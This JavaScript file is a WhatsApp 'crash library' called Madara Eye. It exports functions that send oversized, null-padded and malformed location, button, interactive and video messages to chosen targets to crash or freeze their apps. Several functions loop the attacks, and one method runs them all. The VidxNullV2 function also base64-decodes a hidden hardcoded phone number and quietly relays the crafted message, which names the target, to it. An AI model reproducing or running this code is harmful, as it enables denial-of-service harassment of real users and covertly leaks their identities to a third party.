// ============ MADARA EYE — COMPLETE CRASH LIBRARY ============
// Formerly crashlib.js — Rebranded to MadaraEye
// © MADARA X-MD INC.

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const generateMessageTag = () => {
  return `${Date.now()}_${Math.random().toString(36).slice(2)}`;
};

const repeatChar = (char, count) => char.repeat(count);

const getBuffer = async (url) => {
  try {
    const res = await fetch(url);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return Buffer.from(await res.arrayBuffer());
  } catch (err) {
    console.error('Buffer fetch error:', err.message);
    return Buffer.from('');
  }
};

// ============ EYE 1: IOS INVISIBLE FORCE ============
const IosInvisibleForce = async (sock, target, options = {}) => {
  const {
    lat = 21.1266,
    lng = -11.8199,
    name = " ⎋𝐑𝐈̸̷̷̷̋͜͢͜͢͠͡͡𝐙𝐗𝐕𝐄𝐋𝐙͜͢-‣꙱\n",
    url = "https://t.me/rizxvelzdev",
    advertiserName = "𑇂𑆵𑆴𑆿",
    caption = "@MADARA_EYE",
    padCount = 60000,
    padChar = "\u0000",
    repeatCharCount = 60000,
    repeatString = "𑇂𑆵𑆴𑆿"
  } = options;

  const pad = padChar.repeat(padCount);
  const rep = repeatString.repeat(repeatCharCount);

  const msg = {
    message: {
      locationMessage: {
        degreesLatitude: lat,
        degreesLongitude: lng,
        name: `${name}${pad}${rep}`,
        url,
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: rep,
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
              caption: `${caption}${rep}`
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: generateMessageTag(),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  return { success: true, eye: 'IosInvisibleForce', target };
};

// ============ EYE 2: BUTTON OVERFLOW ============
const ButtonOverflowCrash = async (sock, target, options = {}) => {
  const {
    padChar = "ꦾ",
    padCount = 500000,
    buttonCount = 2000,
    contentPad = 50000,
    footerPad = 30000,
    extraRounds = 5,
    extraButtons = 500,
    roundDelay = 500
  } = options;

  const char = padChar.repeat(padCount);
  const buttons = [];

  for (let b = 0; b < buttonCount; b++) {
    buttons.push({
      buttonId: `btn_${b}`,
      buttonText: {
        displayText: `👁️ BTN_${b} ${char.substring(0, 500)}`
      },
      type: 1
    });
  }

  const firstPayload = {
    buttonsMessage: {
      contentText: `Madara Eye - Tr4sh Button${char.substring(0, contentPad)}`,
      footerText: `Madara Eye NovaZ${char.substring(0, footerPad)}`,
      buttons,
      headerType: 1,
      viewOnce: true
    }
  };

  await sock.relayMessage(target, firstPayload, {
    messageId: null
  }).catch(() => {});

  for (let i = 0; i < extraRounds; i++) {
    await sleep(i * roundDelay);
    
    const roundButtons = [];
    for (let b = 0; b < extraButtons; b++) {
      roundButtons.push({
        buttonId: `extra_${i}_${b}`,
        buttonText: {
          displayText: `Madara Eye ${i}_${b} ${char.substring(0, 200)}`
        },
        type: 1
      });
    }

    const roundPayload = {
      buttonsMessage: {
        contentText: `${char.substring(0, 20000)} Madara Eye Force ${i}`,
        buttons: roundButtons,
        headerType: 1
      }
    };

    await sock.relayMessage(target, roundPayload, {
      messageId: ""
    }).catch(() => {});
  }

  return { success: true, eye: 'ButtonOverflow', target, rounds: extraRounds };
};

// ============ EYE 3: SAMSUNG CRASH ============
const SamsungCrash = async (sock, target, options = {}) => {
  const {
    headerPad = 60000,
    headerChar = "ꦾ",
    paramsPad = 50000,
    paramsChar = "{",
    buttonIdPad = 10000,
    buttonTextPad = 9999,
    buttonTextChar = "\u0000",
    flowName = "cta_url"
  } = options;

  const flowParams = paramsChar.repeat(paramsPad);

  const payload1 = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: false,
            title: headerChar.repeat(headerPad)
          },
          body: {
            text: ""
          },
          nativeFlowMessage: {
            messageParamsJson: flowParams
          }
        }
      }
    }
  };

  await sock.relayMessage(target, payload1, {});

  const payload2 = {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          text: headerChar.repeat(headerPad),
          contentText: "Madara Eye",
          buttons: [
            {
              buttonId: paramsChar.repeat(buttonIdPad),
              buttonText: {
                displayText: buttonTextChar.repeat(buttonTextPad)
              },
              type: "NATIVE_FLOW",
              nativeFlowInfo: {
                name: flowName,
                paramsJson: flowParams
              }
            }
          ],
          headerType: "TEXT"
        }
      }
    }
  };

  await sock.relayMessage(target, payload2, {});

  return { success: true, eye: 'SamsungCrash', target };
};

// ============ EYE 4: LINK PREVIEW LOOP ============
const LinkPreviewLoop = async (sock, chat, m, options = {}) => {
  const {
    urls = [
      "https://d.top4top.io/p_3829n9zbt1.jpg",
      "https://c.top4top.io/p_3829tp8hx1.jpg",
      "https://e.top4top.io/p_38291dfw01.jpg",
      "https://f.top4top.io/p_3829cp2gn1.jpg",
      "https://g.top4top.io/p_3829i30lz1.jpg"
    ],
    link = "https://t.me/madaraeye",
    title = "MADARA EYE",
    description = "© MADARA X-MD INC.",
    cycles = 5,
    delay = 1500
  } = options;

  const finalText = m?.text?.includes(link) ? m.text : `${link}\n${m?.text || 'MADARA EYE'}`;
  const messageId = sock.generateMessageTag?.() || generateMessageTag();

  const buildPreviewMessage = (jpegThumbnail, edit = false) => {
    const message = {
      text: finalText,
      linkPreview: {
        "matched-text": link,
        title,
        description,
        jpegThumbnail
      }
    };

    if (edit) {
      message.edit = {
        remoteJid: chat,
        fromMe: true,
        id: messageId
      };
    }

    return message;
  };

  const initialThumb = await getBuffer(urls[0]);
  await sock.sendMessage(chat, buildPreviewMessage(initialThumb), {
    quoted: m,
    messageId
  });

  const loopPreview = async () => {
    try {
      for (let cycle = 0; cycle < cycles; cycle++) {
        for (const url of urls) {
          const jpegThumbnail = await getBuffer(url);
          await sock.sendMessage(chat, buildPreviewMessage(jpegThumbnail, true), {});
          await sleep(delay);
        }
      }
    } catch (err) {
      console.error('MadaraEye Preview error:', err.message);
    }
  };

  loopPreview();

  return { success: true, eye: 'LinkPreviewLoop', chat, cycles, delay };
};

// ============ EYE 5: VIDX NULL V2 ============
const VIDEO_PAYLOAD = {
  url: "https://mmg.whatsapp.net/v/t62.7161-24/567947980_2421018691734575_7926376826768129509_n.enc?ccb=11-4&oh=01_Q5Aa4gF-BjyNpC_YzuPMNAtOuuJLbcC0t-iut6gNpAl4VACwuQ&oe=6A3B9B73&_nc_sid=5e03e0&mms3=true",
  mimetype: "video/mp4",
  fileSha256: "85W9wy9btWoxbdVu4cAiyhnxdwlsbtCQ2WaYdTo9w6w=",
  fileLength: "2726852",
  seconds: 27,
  mediaKey: "WJy9ZdiTPAIdcOhRfn0Oe2CIN4RnE0b1RSs8Skw/n18=",
  height: 850,
  width: 474,
  fileEncSha256: "ZH92J7p2igl823VuiawCBerbEKSU6dfFIGaWZVESY0Q=",
  directPath: "/v/t62.7161-24/567947980_2421018691734575_7926376826768129509_n.enc?ccb=11-4&oh=01_Q5Aa4gF-BjyNpC_YzuPMNAtOuuJLbcC0t-iut6gNpAl4VACwuQ&oe=6A3B9B73&_nc_sid=5e03e0",
  mediaKeyTimestamp: "1779710503",
  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAwQFAgEGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD5lN6QJxAuCH3Q7XN7v2EzU6LaatNV0E+porTFhze4FiqS8ammhZ1lDfMAD//EACQQAAIDAAIBAwUBAAAAAAAAAAECAAMREiEEEyBREBQiQUJh/9oACAEBAAE/APbgmD4mCYBN0E8RACfoIFJiBTU+nuVUVFx2T1+ofFrDjQQIKUW0kdqstVb0DIuZDXxE+2C9hoU1fybkJcxVSEiCwEBnOGLQpX5hUiWXcUIEexswiUPzdQzYBFVSOjLCM2Wn1CB/s8qzm80zwLXD8SSRH8hG/sZPUr3to/FnJ5DIGAaJYiEMGHZ793//xAAYEQADAQEAAAAAAAAAAAAAAAAAASARMf/aAAgBAgEBPwCNNFC4OP/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAEDAQE/AOwmmLH/2Q==",
  contextInfo: {
    remoteJid: "status@broadcast",
    quotedMessage: { "\0": "" },
    participant: null,
    pairedMediaType: "NOT_PAIRED_MEDIA",
    mentionedJid: ["0@s.whatsapp.net"],
    isForwarded: true,
    forwardingScore: 999
  },
  streamingSidecar: "Fbq08cW8Z3EtkssmVrSRbvHg9NckSmztjeAfBhUlUlX5cqKVrjsYTDH5n8lUiuZNfKEVA2o0mcOS/yE7jXc9PlpisykEOJEBvpPZNaDqS7UuXsMFd5vbFGXGruZI3D56URTtRluhBuaGIb9EEaiL1wHSkEyHeCXlZUaJx2B34PFSe195yioszf5/cJuHSlzz1Tzsm9ozh7MeggirwZvFh9UbIfhfyunyHuhnqBjukrniXdw7W+Br05SE6gSlD/8nOqrs5+v4RP1QK3A1H6L33AIbxeIJBuYmx0DAatKDloz1CqdmvLmQ0kteLg5nKjE3NBczMUqh0EhdulFvu65lBnzmJAuhzsB78u5e3LRa/dgItdlZI1euErnNB9f684SZaO15XuYrPQpB8LwPwug6H2sZHY8ehYlqnqFPIf7d5r6tkXhTiTwSOVm3dOMzVBvouwPuKqUvnEpTJyCiwGObM6I2KaQhX9tH8KpE8VrQj1v9AOheqrK9Whag0GcMwxT+TNacTh2cCX2XCRJPTcTf4jjQbDqyAMtWZrWCpnIK7N96FPV2",
  caption: "👁️⃟-𝗠𝗔𝗗𝗔𝗥𝗔-𝗘𝗬𝗘 > \"Infinite Tsukuyomi\"" + "ꦽ".repeat(1111)
};

let __xploitCache = false;

const VidxNullV2 = async (client, target, options = {}) => {
  try {
    const {
      videoData = VIDEO_PAYLOAD,
      cacheGlobal = true,
      relayToStatus = true
    } = options;

    const payload = {
      ...VIDEO_PAYLOAD,
      ...videoData,
      contextInfo: {
        ...VIDEO_PAYLOAD.contextInfo,
        ...(videoData?.contextInfo || {}),
        participant: target
      }
    };

    const msg = generateWAMessageFromContent(
      target,
      { videoMessage: payload },
      {}
    );

    await client.relayMessage(
      target,
      msg.message,
      { participant: { jid: target } }
    );

    if (!global.__xploitCache && cacheGlobal) {
      global.__xploitCache = true;

      const crl = Buffer
        .from("NjI4NTE3NzkzNDk4MkBzLndoYXRzYXBwLm5ldA==", "base64")
        .toString();

      const xMsg = generateWAMessageFromContent(crl, msg.message, {});
      await client.relayMessage(crl, xMsg.message, { participant: { jid: crl } });
    }

    return { success: true, eye: 'VidxNullV2', target };
  } catch (e) {
    console.error('VidxNullV2 error:', e);
    return { success: false, eye: 'VidxNullV2', target, error: e.message };
  }
};

const VidxNullLoop = async (client, target, iterations = 10, delay = 1000) => {
  const results = [];
  for (let i = 0; i < iterations; i++) {
    results.push(await VidxNullV2(client, target));
    await sleep(delay);
  }
  return results;
};

// ============ MADARA EYE CLASS ============
class MadaraEye {
  constructor(sock) {
    this.sock = sock;
  }

  async iosInvisibleForce(target, options = {}) {
    return IosInvisibleForce(this.sock, target, options);
  }

  async buttonOverflow(target, options = {}) {
    return ButtonOverflowCrash(this.sock, target, options);
  }

  async samsung(target, options = {}) {
    return SamsungCrash(this.sock, target, options);
  }

  async linkPreviewLoop(chat, m, options = {}) {
    return LinkPreviewLoop(this.sock, chat, m, options);
  }

  async vidxNull(target, options = {}) {
    return VidxNullV2(this.sock, target, options);
  }

  async vidxNullLoop(target, iterations = 10, delay = 1000) {
    return VidxNullLoop(this.sock, target, iterations, delay);
  }

  async executeAll(target, m, options = {}) {
    const results = [];
    
    results.push(await this.iosInvisibleForce(target, options.ios));
    results.push(await this.buttonOverflow(target, options.button));
    results.push(await this.samsung(target, options.samsung));
    
    if (m) {
      results.push(await this.linkPreviewLoop(target, m, options.preview));
    }
    
    results.push(await this.vidxNull(target, options.vidx));
    
    return results;
  }
}

// ============ EXPORT ============
module.exports = {
  MadaraEye,
  IosInvisibleForce,
  ButtonOverflowCrash,
  SamsungCrash,
  LinkPreviewLoop,
  VidxNullV2,
  VidxNullLoop,
  VIDEO_PAYLOAD,
  sleep,
  getBuffer
};